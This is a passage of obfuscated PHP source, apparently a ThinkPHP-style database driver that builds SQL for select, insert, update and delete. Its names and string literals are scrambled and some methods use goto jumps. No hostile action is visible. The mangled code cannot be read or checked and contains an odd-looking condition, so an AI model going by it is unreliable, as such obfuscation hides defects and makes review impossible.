$b’¼µ‹ñ³ƒ[566] => $cæ×”ĞˆÅ»[5], $b’¼µ‹ñ³ƒ[17] => $cæ×”ĞˆÅ»[6]); } $cˆÛŞì™ñ[$b’¼µ‹ñ³ƒ[595]] = $b’¼µ‹ñ³ƒ[33]; return $cˆÛŞì™ñ; } protected function debug() { $d‚±¤®ìÕ¬ =& $_SERVER[°Óó£ÌİóèÅ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $d‚±¤®ìÕ¬[666]; if (think_config($d‚±¤®ìÕ¬[667])) { think_status($d‚±¤®ìÕ¬[668]); think_trace($this->queryStr . $d‚±¤®ìÕ¬[669] . think_status($d‚±¤®ìÕ¬[20], $d‚±¤®ìÕ¬[668], 6) . $d‚±¤®ìÕ¬[670], $d‚±¤®ìÕ¬[33], $d‚±¤®ìÕ¬[671]); } } protected function parseLock($c†àŸØ—¢¡ = false) { $EÂŠÊœÄùÅ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$c†àŸØ—¢¡) { return $EÂŠÊœÄùÅ[33]; } if ($EÂŠÊœÄùÅ[597] == $this->dbType) { return $EÂŠÊœÄùÅ[672]; } return $EÂŠÊœÄùÅ[673]; } protected function parseSet($fÓÀöâ ª) { $fÍ¼Ê˜åô =& $_SERVER[°Óó£ÌİóèÅ]; foreach ($fÓÀöâ ª as $cª´Çï¤ => $BÏù‹†¾Ó³) { if (is_array($BÏù‹†¾Ó³) && $fÍ¼Ê˜åô[296] == $BÏù‹†¾Ó³[0]) { $fœÙéãĞ´¬[] = $this->parseKey($cª´Çï¤) . $fÍ¼Ê˜åô[674] . $BÏù‹†¾Ó³[1]; } elseif (is_scalar($BÏù‹†¾Ó³) || is_null($BÏù‹†¾Ó³)) { $fœÙéãĞ´¬[] = $this->parseKey($cª´Çï¤) . $fÍ¼Ê˜åô[674] . $this->parseValue($BÏù‹†¾Ó³); } } return $fÍ¼Ê˜åô[675] . implode($fÍ¼Ê˜åô[47], $fœÙéãĞ´¬); } protected function bindParam($bĞÆ—®î¬©, $BÑÜËÁµµâ) { $this->bind[$_SERVER[°Óó£ÌİóèÅ][4] . $bĞÆ—®î¬©] = $BÑÜËÁµµâ; } protected function parseBind($Aêó¤ÈŒˆ¤) { $Aêó¤ÈŒˆ¤ = array_merge($this->bind, $Aêó¤ÈŒˆ¤); $this->bind = array(); return $Aêó¤ÈŒˆ¤; } function parseKey(&$Cé„ ¹¥äŒ, $aÚ¤ù®¥  = true) { if ($aÚ¤ù®¥ ) { $Cé„ ¹¥äŒ = $this->parseKeyCheck($Cé„ ¹¥äŒ); } return $Cé„ ¹¥äŒ; } function parseKeyCheck($DË³¦Îô¹–) { $eãİ“´Ş =& $_SERVER[°Óó£ÌİóèÅ]; $DË³¦Îô¹– = trim($DË³¦Îô¹–); if (!preg_match($eãİ“´Ş[676], $DË³¦Îô¹–)) { think_exception($eãİ“´Ş[677] . $DË³¦Îô¹–); } return $DË³¦Îô¹–; } protected function parseValue($DÏòÓ™‹ŒÉ) { $aĞ—’¤‘µ¿ =& $_SERVER[°Óó£ÌİóèÅ]; if (is_string($DÏòÓ™‹ŒÉ)) { $DÏòÓ™‹ŒÉ = $aĞ—’¤‘µ¿[636] . $this->escapeString($DÏòÓ™‹ŒÉ) . $aĞ—’¤‘µ¿[636]; } elseif (isset($DÏòÓ™‹ŒÉ[0]) && is_string($DÏòÓ™‹ŒÉ[0]) && strtolower($DÏòÓ™‹ŒÉ[0]) == $aĞ—’¤‘µ¿[296]) { $DÏòÓ™‹ŒÉ = $this->escapeString($DÏòÓ™‹ŒÉ[1]); } elseif (is_array($DÏòÓ™‹ŒÉ)) { $DÏòÓ™‹ŒÉ = array_map(array($this, $aĞ—’¤‘µ¿[637]), $DÏòÓ™‹ŒÉ); } elseif (is_bool($DÏòÓ™‹ŒÉ)) { $DÏòÓ™‹ŒÉ = $DÏòÓ™‹ŒÉ ? $aĞ—’¤‘µ¿[384] : $aĞ—’¤‘µ¿[410]; } elseif (is_null($DÏòÓ™‹ŒÉ)) { $DÏòÓ™‹ŒÉ = $aĞ—’¤‘µ¿[108]; } return $DÏòÓ™‹ŒÉ; } protected function parseField($fæê—õêàŞ) { $A…ŸŒÀÇÒ =& $_SERVER[°Óó£ÌİóèÅ]; if (is_string($fæê—õêàŞ) && strpos($fæê—õêàŞ, $A…ŸŒÀÇÒ[47])) { $fæê—õêàŞ = explode($A…ŸŒÀÇÒ[47], $fæê—õêàŞ); } if (is_array($fæê—õêàŞ)) { $eŒÇÇ¹©Ò = array(); foreach ($fæê—õêàŞ as $cïàİíÆù => $Fî÷´‡ÑŒİ) { if (!is_numeric($cïàİíÆù)) { $eŒÇÇ¹©Ò[] = $this->parseKey($cïàİíÆù) . $A…ŸŒÀÇÒ[678] . $this->parseKey($Fî÷´‡ÑŒİ); } else { $eŒÇÇ¹©Ò[] = $this->parseKey($Fî÷´‡ÑŒİ); } } $EŞàÃº‡« = implode($A…ŸŒÀÇÒ[47], $eŒÇÇ¹©Ò); } elseif (is_string($fæê—õêàŞ) && !empty($fæê—õêàŞ)) { $EŞàÃº‡« = $fæê—õêàŞ; } else { $EŞàÃº‡« = $A…ŸŒÀÇÒ[181]; } return $EŞàÃº‡«; } protected function parseTable($FÌœËŒ¨¨) { $A‚ß¶Çà¶ =& $_SERVER[°Óó£ÌİóèÅ]; if (is_array($FÌœËŒ¨¨)) { $f†‹®È³èÌ = array(); foreach ($FÌœËŒ¨¨ as $dÆÀÜ¶Ñº => $aÁĞˆÆ¡Ü) { if (!is_numeric($dÆÀÜ¶Ñº)) { $f†‹®È³èÌ[] = $this->parseKey($dÆÀÜ¶Ñº) . $A‚ß¶Çà¶[50] . $this->parseKey($aÁĞˆÆ¡Ü); } else { $f†‹®È³èÌ[] = $this->parseKey($dÆÀÜ¶Ñº); } } $FÌœËŒ¨¨ = $f†‹®È³èÌ; } elseif (is_string($FÌœËŒ¨¨)) { if (strstr($FÌœËŒ¨¨, $A‚ß¶Çà¶[50])) { return $FÌœËŒ¨¨; } $FÌœËŒ¨¨ = explode($A‚ß¶Çà¶[47], $FÌœËŒ¨¨); array_walk($FÌœËŒ¨¨, array($this, $A‚ß¶Çà¶[584])); } return $A‚ß¶Çà¶[679] . trim(implode($A‚ß¶Çà¶[680], $FÌœËŒ¨¨), $A‚ß¶Çà¶[590]) . $A‚ß¶Çà¶[679]; } protected function parseWhere($C¶ÀáªÜé) { $BÚ‘ÕÄó‘´ =& $_SERVER[°Óó£ÌİóèÅ]; $D©š‰Š“æ = $BÚ‘ÕÄó‘´[33]; if (is_string($C¶ÀáªÜé)) { $D©š‰Š“æ = $C¶ÀáªÜé; } else { $EÔÄ¥÷ÇŒë = isset($C¶ÀáªÜé[$BÚ‘ÕÄó‘´[681]]) ? strtoupper($C¶ÀáªÜé[$BÚ‘ÕÄó‘´[681]]) : $BÚ‘ÕÄó‘´[33]; if (in_array($EÔÄ¥÷ÇŒë, array($BÚ‘ÕÄó‘´[682], $BÚ‘ÕÄó‘´[683], $BÚ‘ÕÄó‘´[684]))) { $EÔÄ¥÷ÇŒë = $BÚ‘ÕÄó‘´[50] . $EÔÄ¥÷ÇŒë . $BÚ‘ÕÄó‘´[50]; unset($C¶ÀáªÜé[$BÚ‘ÕÄó‘´[681]]); } else { $EÔÄ¥÷ÇŒë = $BÚ‘ÕÄó‘´[685]; } foreach ($C¶ÀáªÜé as $e˜Öëµ—å => $EÏƒØÀí µ) { $D©š‰Š“æ .= $BÚ‘ÕÄó‘´[276]; if (is_numeric($e˜Öëµ—å)) { $e˜Öëµ—å = $BÚ‘ÕÄó‘´[686]; } if (0 === strpos($e˜Öëµ—å, $BÚ‘ÕÄó‘´[79])) { $D©š‰Š“æ .= $this->parseThinkWhere($e˜Öëµ—å, $EÏƒØÀí µ); } else { if (!preg_match($BÚ‘ÕÄó‘´[687], trim($e˜Öëµ—å))) { think_exception(think_lang($BÚ‘ÕÄó‘´[688]) . $BÚ‘ÕÄó‘´[4] . $e˜Öëµ—å); } $E‚µ¶‹êƒ = is_array($EÏƒØÀí µ) && isset($EÏƒØÀí µ[$BÚ‘ÕÄó‘´[689]]); $e˜Öëµ—å = trim($e˜Öëµ—å); if (strpos($e˜Öëµ—å, $BÚ‘ÕÄó‘´[282])) { $Aç®š‘¹é¬ = explode($BÚ‘ÕÄó‘´[282], $e˜Öëµ—å); $F—‰ÑÃĞ˜ = array(); foreach ($Aç®š‘¹é¬ as $e³®ÔÁ¯Å => $CØ‚–ñŞ«Ú) { $c¦ô‰ËµÙ = $E‚µ¶‹êƒ ? $EÏƒØÀí µ[$e³®ÔÁ¯Å] : $EÏƒØÀí µ; $F—‰ÑÃĞ˜[] = $BÚ‘ÕÄó‘´[259] . $this->parseWhereItem($this->parseKey($CØ‚–ñŞ«Ú), $c¦ô‰ËµÙ) . $BÚ‘ÕÄó‘´[583]; } $D©š‰Š“æ .= implode($BÚ‘ÕÄó‘´[690], $F—‰ÑÃĞ˜); } elseif (strpos($e˜Öëµ—å, $BÚ‘ÕÄó‘´[283])) { $Aç®š‘¹é¬ = explode($BÚ‘ÕÄó‘´[283], $e˜Öëµ—å); $F—‰ÑÃĞ˜ = array(); foreach ($Aç®š‘¹é¬ as $e³®ÔÁ¯Å => $CØ‚–ñŞ«Ú) { $c¦ô‰ËµÙ = $E‚µ¶‹êƒ ? $EÏƒØÀí µ[$e³®ÔÁ¯Å] : $EÏƒØÀí µ; $F—‰ÑÃĞ˜[] = $BÚ‘ÕÄó‘´[259] . $this->parseWhereItem($this->parseKey($CØ‚–ñŞ«Ú), $c¦ô‰ËµÙ) . $BÚ‘ÕÄó‘´[583]; } $D©š‰Š“æ .= implode($BÚ‘ÕÄó‘´[685], $F—‰ÑÃĞ˜); } else { $D©š‰Š“æ .= $this->parseWhereItem($this->parseKey($e˜Öëµ—å), $EÏƒØÀí µ); } } $D©š‰Š“æ .= $BÚ‘ÕÄó‘´[277] . $EÔÄ¥÷ÇŒë; } $D©š‰Š“æ = substr($D©š‰Š“æ, 0, -strlen($EÔÄ¥÷ÇŒë)); } return empty($D©š‰Š“æ) ? $BÚ‘ÕÄó‘´[33] : $BÚ‘ÕÄó‘´[691] . $D©š‰Š“æ; } protected function parseWhereItem($b‡ÈÉÊˆ·›, $Bá¾÷ææ‹¾) { $C¡ì¡“›ê± =& $_SERVER[°Óó£ÌİóèÅ]; $eÚßœ™Éø¿ = $C¡ì¡“›ê±[33]; if (is_array($Bá¾÷ææ‹¾)) { if (is_string($Bá¾÷ææ‹¾[0])) { $b›¼éì§Å‹ = strtolower($Bá¾÷ææ‹¾[0]); if (in_array($Bá¾÷ææ‹¾[0], array($C¡ì¡“›ê±[674], $C¡ì¡“›ê±[692], $C¡ì¡“›ê±[693], $C¡ì¡“›ê±[694], $C¡ì¡“›ê±[695], $C¡ì¡“›ê±[696]))) { $eÚßœ™Éø¿ .= $b‡ÈÉÊˆ·› . $C¡ì¡“›ê±[50] . $Bá¾÷ææ‹¾[0] . $C¡ì¡“›ê±[50] . $this->parseValue($Bá¾÷ææ‹¾[1]); } elseif (preg_match($C¡ì¡“›ê±[697], $Bá¾÷ææ‹¾[0])) { $eÚßœ™Éø¿ .= $b‡ÈÉÊˆ·› . $C¡ì¡“›ê±[50] . $this->exp[$b›¼éì§Å‹] . $C¡ì¡“›ê±[50] . $this->parseValue($Bá¾÷ææ‹¾[1]); } elseif (preg_match($C¡ì¡“›ê±[698], $Bá¾÷ææ‹¾[0])) { if (is_array($Bá¾÷ææ‹¾[1])) { $DØí¯µã½· = isset($Bá¾÷ææ‹¾[2]) ? strtoupper($Bá¾÷ææ‹¾[2]) : $C¡ì¡“›ê±[683]; if (in_array($DØí¯µã½·, array($C¡ì¡“›ê±[682], $C¡ì¡“›ê±[683], $C¡ì¡“›ê±[684]))) { $aõÜù“°ˆ = array(); foreach ($Bá¾÷ææ‹¾[1] as $aêÅÈÕˆË”) { $aõÜù“°ˆ[] = $b‡ÈÉÊˆ·› . $C¡ì¡“›ê±[50] . $this->exp[$b›¼éì§Å‹] . $C¡ì¡“›ê±[50] . $this->parseValue($aêÅÈÕˆË”); } $eÚßœ™Éø¿ .= $C¡ì¡“›ê±[259] . implode($C¡ì¡“›ê±[50] . $DØí¯µã½· . $C¡ì¡“›ê±[50], $aõÜù“°ˆ) . $C¡ì¡“›ê±[583]; } } else { $eÚßœ™Éø¿ .= $b‡ÈÉÊˆ·› . $C¡ì¡“›ê±[50] . $this->exp[$b›¼éì§Å‹] . $C¡ì¡“›ê±[50] . $this->parseValue($Bá¾÷ææ‹¾[1]); } } elseif ($C¡ì¡“›ê±[296] == $b›¼éì§Å‹) { $eÚßœ™Éø¿ .= $C¡ì¡“›ê±[581] . $b‡ÈÉÊˆ·› . $C¡ì¡“›ê±[50] . $Bá¾÷ææ‹¾[1] . $C¡ì¡“›ê±[699]; } elseif (preg_match($C¡ì¡“›ê±[700], $Bá¾÷ææ‹¾[0])) { if (isset($Bá¾÷ææ‹¾[2]) && $C¡ì¡“›ê±[296] == $Bá¾÷ææ‹¾[2]) { $eÚßœ™Éø¿ .= $b‡ÈÉÊˆ·› . $C¡ì¡“›ê±[50] . $this->exp[$b›¼éì§Å‹] . $C¡ì¡“›ê±[50] . $Bá¾÷ææ‹¾[1]; } else { if (is_string($Bá¾÷ææ‹¾[1])) { $Bá¾÷ææ‹¾[1] = explode($C¡ì¡“›ê±[47], $Bá¾÷ææ‹¾[1]); } $Aßóè•­¹ƒ = implode($C¡ì¡“›ê±[47], $this->parseValue($Bá¾÷ææ‹¾[1])); $eÚßœ™Éø¿ .= $b‡ÈÉÊˆ·› . $C¡ì¡“›ê±[50] . $this->exp[$b›¼éì§Å‹] . $C¡ì¡“›ê±[581] . $Aßóè•­¹ƒ . $C¡ì¡“›ê±[583]; } } elseif (preg_match($C¡ì¡“›ê±[701], $Bá¾÷ææ‹¾[0])) { $aˆòŞˆ¸Ì = is_string($Bá¾÷ææ‹¾[1]) ? explode($C¡ì¡“›ê±[47], $Bá¾÷ææ‹¾[1]) : $Bá¾÷ææ‹¾[1]; $eÚßœ™Éø¿ .= $C¡ì¡“›ê±[581] . $b‡ÈÉÊˆ·› . $C¡ì¡“›ê±[50] . $this->exp[$b›¼éì§Å‹] . $C¡ì¡“›ê±[50] . $this->parseValue($aˆòŞˆ¸Ì[0]) . $C¡ì¡“›ê±[685] . $this->parseValue($aˆòŞˆ¸Ì[1]) . $C¡ì¡“›ê±[277]; } else { think_exception(think_lang($C¡ì¡“›ê±[688]) . $C¡ì¡“›ê±[4] . $Bá¾÷ææ‹¾[0]); } } else { $fÜ¬éÖŒŒ = count($Bá¾÷ææ‹¾); $c™áƒ‡¥‹ = isset($Bá¾÷ææ‹¾[$fÜ¬éÖŒŒ - 1]) ? strtoupper($Bá¾÷ææ‹¾[$fÜ¬éÖŒŒ - 1]) : $C¡ì¡“›ê±[33]; if (in_array($c™áƒ‡¥‹, array($C¡ì¡“›ê±[682], $C¡ì¡“›ê±[683], $C¡ì¡“›ê±[684]))) { $fÜ¬éÖŒŒ = $fÜ¬éÖŒŒ - 1; } else { $c™áƒ‡¥‹ = $C¡ì¡“›ê±[682]; } for ($B¼ÛØõÃŸ = 0; $B¼ÛØõÃŸ < $fÜ¬éÖŒŒ; $B¼ÛØõÃŸ++) { $aˆòŞˆ¸Ì = is_array($Bá¾÷ææ‹¾[$B¼ÛØõÃŸ]) ? $Bá¾÷ææ‹¾[$B¼ÛØõÃŸ][1] : $Bá¾÷ææ‹¾[$B¼ÛØõÃŸ]; if ($C¡ì¡“›ê±[296] == strtolower($Bá¾÷ææ‹¾[$B¼ÛØõÃŸ][0])) { $eÚßœ™Éø¿ .= $C¡ì¡“›ê±[259] . $b‡ÈÉÊˆ·› . $C¡ì¡“›ê±[50] . $aˆòŞˆ¸Ì . $C¡ì¡“›ê±[699] . $c™áƒ‡¥‹ . $C¡ì¡“›ê±[50]; } else { $FÙÁä¯ôå… = is_array($Bá¾÷ææ‹¾[$B¼ÛØõÃŸ]) ? $this->exp[strtolower($Bá¾÷ææ‹¾[$B¼ÛØõÃŸ][0])] : $C¡ì¡“›ê±[674]; if (!$FÙÁä¯ôå… && is_array($Bá¾÷ææ‹¾[$B¼ÛØõÃŸ]) && in_array($Bá¾÷ææ‹¾[$B¼ÛØõÃŸ][0], array($C¡ì¡“›ê±[674], $C¡ì¡“›ê±[692], $C¡ì¡“›ê±[693], $C¡ì¡“›ê±[694], $C¡ì¡“›ê±[695], $C¡ì¡“›ê±[696]))) { $FÙÁä¯ôå… = $Bá¾÷ææ‹¾[$B¼ÛØõÃŸ][0]; } $eÚßœ™Éø¿ .= $C¡ì¡“›ê±[259] . $b‡ÈÉÊˆ·› . $C¡ì¡“›ê±[50] . $FÙÁä¯ôå… . $C¡ì¡“›ê±[50] . $this->parseValue($aˆòŞˆ¸Ì) . $C¡ì¡“›ê±[699] . $c™áƒ‡¥‹ . $C¡ì¡“›ê±[50]; } } $eÚßœ™Éø¿ = substr($eÚßœ™Éø¿, 0, -4); } } else { $eÚßœ™Éø¿ .= $b‡ÈÉÊˆ·› . $C¡ì¡“›ê±[702] . $this->parseValue($Bá¾÷ææ‹¾); } return $eÚßœ™Éø¿; } protected function parseThinkWhere($bë÷ç·ìŞ¿, $eå ¬„Ó¨) { $c‰»‰è– =& $_SERVER[°Óó£ÌİóèÅ]; $FÜ‡£†ïø = $c‰»‰è–[33]; switch ($bë÷ç·ìŞ¿) { case $c‰»‰è–[349]: $FÜ‡£†ïø = $eå ¬„Ó¨; break; case $c‰»‰è–[686]: $FÜ‡£†ïø = is_string($eå ¬„Ó¨) ? $eå ¬„Ó¨ : substr($this->parseWhere($eå ¬„Ó¨), 6); break; case $c‰»‰è–[703]: parse_str($eå ¬„Ó¨, $D•Ã¹¡ÇÌ§); if (isset($D•Ã¹¡ÇÌ§[$c‰»‰è–[681]])) { $eÂ’‘ÂÂİ = $c‰»‰è–[50] . strtoupper($D•Ã¹¡ÇÌ§[$c‰»‰è–[681]]) . $c‰»‰è–[50]; unset($D•Ã¹¡ÇÌ§[$c‰»‰è–[681]]); } else { $eÂ’‘ÂÂİ = $c‰»‰è–[685]; } $f…œ‘‘ª— = array(); foreach ($D•Ã¹¡ÇÌ§ as $Cò‡ïŒ°‚› => $Eİ±¦±ó‚å) { $f…œ‘‘ª—[] = $this->parseKey($Cò‡ïŒ°‚›) . $c‰»‰è–[702] . $this->parseValue($Eİ±¦±ó‚å); } $FÜ‡£†ïø = implode($eÂ’‘ÂÂİ, $f…œ‘‘ª—); break; } return $FÜ‡£†ïø; } protected function parseLimit($bßê¿›¡–) { $aÉ¡±† ™ =& $_SERVER[°Óó£ÌİóèÅ]; return !empty($bßê¿›¡–) ? $aÉ¡±† ™[48] . $bßê¿›¡– . $aÉ¡±† ™[50] : $aÉ¡±† ™[33]; } protected function parseJoin($Bò¦­ê¬æ) { $Fô’¾‚¸À =& $_SERVER[°Óó£ÌİóèÅ]; $dŠÊíçªÀ’ = $Fô’¾‚¸À[33]; if (!empty($Bò¦­ê¬æ)) { if (is_array($Bò¦­ê¬æ)) { foreach ($Bò¦­ê¬æ as $cÛ¾ã®“ñ => $E—äà¦“˜¬) { if (!1 !== stripos($E—äà¦“˜¬, $Fô’¾‚¸À[704])) { $dŠÊíçªÀ’ .= $Fô’¾‚¸À[50] . $E—äà¦“˜¬; } else { $dŠÊíçªÀ’ .= $Fô’¾‚¸À[705] . $E—äà¦“˜¬; } } } else { $dŠÊíçªÀ’ .= $Fô’¾‚¸À[705] . $Bò¦­ê¬æ; } } $dŠÊíçªÀ’ = preg_replace($Fô’¾‚¸À[706], think_config($Fô’¾‚¸À[609]) . $Fô’¾‚¸À[707], $dŠÊíçªÀ’); return $dŠÊíçªÀ’; } protected function parseOrder($aå»ëàÍÙÉ) { $e‰Ÿƒ™èÖ =& $_SERVER[°Óó£ÌİóèÅ]; if (is_array($aå»ëàÍÙÉ)) { $E™ñ¶·Áº¸ = array(); foreach ($aå»ëàÍÙÉ as $AÃÍğš¯ => $EÕÇ¥ªõ¨‚) { if (is_numeric($AÃÍğš¯)) { $E™ñ¶·Áº¸[] = $this->parseKey($EÕÇ¥ªõ¨‚); } else { $EÕÇ¥ªõ¨‚ = in_array(strtoupper(trim($EÕÇ¥ªõ¨‚)), array($e‰Ÿƒ™èÖ[708], $e‰Ÿƒ™èÖ[709])) ? $e‰Ÿƒ™èÖ[50] . $EÕÇ¥ªõ¨‚ : $e‰Ÿƒ™èÖ[33]; if (preg_match($e‰Ÿƒ™èÖ[710], $AÃÍğš¯)) { $E™ñ¶·Áº¸[] = $this->parseKey($AÃÍğš¯) . $EÕÇ¥ªõ¨‚; } else { think_exception($e‰Ÿƒ™èÖ[711] . $AÃÍğš¯); } } } $aå»ëàÍÙÉ = implode($e‰Ÿƒ™èÖ[47], $E™ñ¶·Áº¸); } return !empty($aå»ëàÍÙÉ) ? $e‰Ÿƒ™èÖ[712] . $aå»ëàÍÙÉ : $e‰Ÿƒ™èÖ[33]; } protected function parseGroup($B¦¯ğÜ²ö) { $c•Ì¡Û¾éà =& $_SERVER[°Óó£ÌİóèÅ]; return !empty($B¦¯ğÜ²ö) ? $c•Ì¡Û¾éà[713] . $B¦¯ğÜ²ö : $c•Ì¡Û¾éà[33]; } protected function parseHaving($eä¬Œê³³) { $eĞƒ”‘âÏ¥ =& $_SERVER[°Óó£ÌİóèÅ]; return !empty($eä¬Œê³³) ? $eĞƒ”‘âÏ¥[714] . $eä¬Œê³³ : $eĞƒ”‘âÏ¥[33]; } protected function parseComment($E½±Ó ĞöÏ) { $e·ªŒÊÓ“° =& $_SERVER[°Óó£ÌİóèÅ]; return !empty($E½±Ó ĞöÏ) ? $e·ªŒÊÓ“°[715] . $E½±Ó ĞöÏ . $e·ªŒÊÓ“°[716] : $e·ªŒÊÓ“°[33]; } protected function parseDistinct($c¼§Ë¡Ø­†) { $c¸›Å¹­¢ =& $_SERVER[°Óó£ÌİóèÅ]; return !empty($c¼§Ë¡Ø­†) ? $c¸›Å¹­¢[717] : $c¸›Å¹­¢[33]; } protected function parseUnion($c„’¼µÛ’‹) { $C‹ÚáŸŠÓ =& $_SERVER[°Óó£ÌİóèÅ]; if (empty($c„’¼µÛ’‹)) { return $C‹ÚáŸŠÓ[33]; } if (isset($c„’¼µÛ’‹[$C‹ÚáŸŠÓ[347]])) { $aã†„¾× = $C‹ÚáŸŠÓ[718]; unset($c„’¼µÛ’‹[$C‹ÚáŸŠÓ[347]]); } else { $aã†„¾× = $C‹ÚáŸŠÓ[719]; } foreach ($c„’¼µÛ’‹ as $cé¡§¹†½ö) { $aÂ÷´ô›‹½[] = $aã†„¾× . (is_array($cé¡§¹†½ö) ? $this->buildSelectSql($cé¡§¹†½ö) : $cé¡§¹†½ö); } return implode($C‹ÚáŸŠÓ[50], $aÂ÷´ô›‹½); } public function insert($aÃ‡¸†…¯›, $dÒ„¬§‘Ã = array(), $e¡»“Äßá = false) { goto dğÙµŠùÚ; aİã×òÕÍ„: $DËå¨œ¹Ù .= $this->parseComment(!empty($dÒ„¬§‘Ã[$e’ë°È·íÁ[351]]) ? $dÒ„¬§‘Ã[$e’ë°È·íÁ[351]] : $e’ë°È·íÁ[33]); return $this->execute($DËå¨œ¹Ù, $this->parseBind(!empty($dÒ„¬§‘Ã[$e’ë°È·íÁ[284]]) ? $dÒ„¬§‘Ã[$e’ë°È·íÁ[284]] : array())); goto e‚®ò‚æè; dğÙµŠùÚ: $e’ë°È·íÁ =& $_SERVER[°Óó£ÌİóèÅ]; $eÀ ²ÊØ¤Æ = $Dç¦í¢µ± = array(); $this->model = $dÒ„¬§‘Ã[$e’ë°È·íÁ[280]]; goto dÅâêÛ‰ƒã; dÅâêÛ‰ƒã: foreach ($aÃ‡¸†…¯› as $AğÍõ†›´ => $B·ÆòòË) { if (is_array($B·ÆòòË) && $e’ë°È·íÁ[296] == $B·ÆòòË[0]) { $Dç¦í¢µ±[] = $this->parseKey($AğÍõ†›´); $eÀ ²ÊØ¤Æ[] = $B·ÆòòË[1]; } elseif (is_scalar($B·ÆòòË) || is_null($B·ÆòòË)) { $Dç¦í¢µ±[] = $this->parseKey($AğÍõ†›´); $eÀ ²ÊØ¤Æ[] = $this->parseValue($B·ÆòòË); } } $DËå¨œ¹Ù = ($e¡»“Äßá ? $e’ë°È·íÁ[585] : $e’ë°È·íÁ[586]) . $e’ë°È·íÁ[587] . $this->parseTable($dÒ„¬§‘Ã[$e’ë°È·íÁ[278]]) . $e’ë°È·íÁ[581] . implode($e’ë°È·íÁ[47], $Dç¦í¢µ±) . $e’ë°È·íÁ[582] . implode($e’ë°È·íÁ[47], $eÀ ²ÊØ¤Æ) . $e’ë°È·íÁ[583]; $DËå¨œ¹Ù .= $this->parseLock(isset($dÒ„¬§‘Ã[$e’ë°È·íÁ[545]]) ? $dÒ„¬§‘Ã[$e’ë°È·íÁ[545]] : !1); goto aİã×òÕÍ„; e‚®ò‚æè: } public function selectInsert($A†ÆÔÙºÂ¡, $aŸÜí¢ˆµ„, $D °Ï„Äø‹ = array()) { goto f ØÀÂ†³±; BÁ™´»‚²: array_walk($A†ÆÔÙºÂ¡, array($this, $b»ÂÒÙ•ÆŞ[584])); $cÕèç³è‹Ë = $b»ÂÒÙ•ÆŞ[720] . $this->parseTable($aŸÜí¢ˆµ„) . $b»ÂÒÙ•ÆŞ[581] . implode($b»ÂÒÙ•ÆŞ[47], $A†ÆÔÙºÂ¡) . $b»ÂÒÙ•ÆŞ[699]; $cÕèç³è‹Ë .= $this->buildSelectSql($D °Ï„Äø‹); goto F…Ì±»àçæ; f ØÀÂ†³±: $b»ÂÒÙ•ÆŞ =& $_SERVER[°Óó£ÌİóèÅ]; $this->model = $D °Ï„Äø‹[$b»ÂÒÙ•ÆŞ[280]]; if (is_string($A†ÆÔÙºÂ¡)) { $A†ÆÔÙºÂ¡ = explode($b»ÂÒÙ•ÆŞ[47], $A†ÆÔÙºÂ¡); } goto BÁ™´»‚²; F…Ì±»àçæ: return $this->execute($cÕèç³è‹Ë, $this->parseBind(!empty($D °Ï„Äø‹[$b»ÂÒÙ•ÆŞ[284]]) ? $D °Ï„Äø‹[$b»ÂÒÙ•ÆŞ[284]] : array())); goto AÔ¡ÅÖƒ; AÔ¡ÅÖƒ: } public function update($eÃîØË´ÔÂ, $A™ÃöíÌ…ø) { $eƒõÄ×Üõğ =& $_SERVER[°Óó£ÌİóèÅ]; $this->model = $A™ÃöíÌ…ø[$eƒõÄ×Üõğ[280]]; $EÀÕ×«ñç† = $eƒõÄ×Üõğ[721] . $this->parseTable($A™ÃöíÌ…ø[$eƒõÄ×Üõğ[278]]) . $this->parseSet($eÃîØË´ÔÂ) . $this->parseWhere(!empty($A™ÃöíÌ…ø[$eƒõÄ×Üõğ[274]]) ? $A™ÃöíÌ…ø[$eƒõÄ×Üõğ[274]] : $eƒõÄ×Üõğ[33]) . $this->parseOrder(!empty($A™ÃöíÌ…ø[$eƒõÄ×Üõğ[360]]) ? $A™ÃöíÌ…ø[$eƒõÄ×Üõğ[360]] : $eƒõÄ×Üõğ[33]) . $this->parseLimit(!empty($A™ÃöíÌ…ø[$eƒõÄ×Üõğ[291]]) ? $A™ÃöíÌ…ø[$eƒõÄ×Üõğ[291]] : $eƒõÄ×Üõğ[33]) . $this->parseLock(isset($A™ÃöíÌ…ø[$eƒõÄ×Üõğ[545]]) ? $A™ÃöíÌ…ø[$eƒõÄ×Üõğ[545]] : !1) . $this->parseComment(!empty($A™ÃöíÌ…ø[$eƒõÄ×Üõğ[351]]) ? $A™ÃöíÌ…ø[$eƒõÄ×Üõğ[351]] : $eƒõÄ×Üõğ[33]); return $this->execute($EÀÕ×«ñç†, $this->parseBind(!empty($A™ÃöíÌ…ø[$eƒõÄ×Üõğ[284]]) ? $A™ÃöíÌ…ø[$eƒõÄ×Üõğ[284]] : array())); } public function delete($e‹ĞêâÈ¤ = array()) { $FÊ‰Ã‚¨¼ =& $_SERVER[°Óó£ÌİóèÅ]; $this->model = $e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[280]]; $dæ–”  = $FÊ‰Ã‚¨¼[722] . $this->parseTable($e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[278]]) . $this->parseWhere(!empty($e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[274]]) ? $e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[274]] : $FÊ‰Ã‚¨¼[33]) . $this->parseOrder(!empty($e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[360]]) ? $e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[360]] : $FÊ‰Ã‚¨¼[33]) . $this->parseLimit(!empty($e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[291]]) ? $e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[291]] : $FÊ‰Ã‚¨¼[33]) . $this->parseLock(isset($e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[545]]) ? $e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[545]] : !1) . $this->parseComment(!empty($e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[351]]) ? $e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[351]] : $FÊ‰Ã‚¨¼[33]); return $this->execute($dæ–” , $this->parseBind(!empty($e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[284]]) ? $e‹ĞêâÈ¤[$FÊ‰Ã‚¨¼[284]] : array())); } public function select($D¬‰¹ù•Ú„ = array()) { goto e§ŠéÄº†; e§ŠéÄº†: $B–êº·¨’Ñ =& $_SERVER[°Óó£ÌİóèÅ]; $this->model = 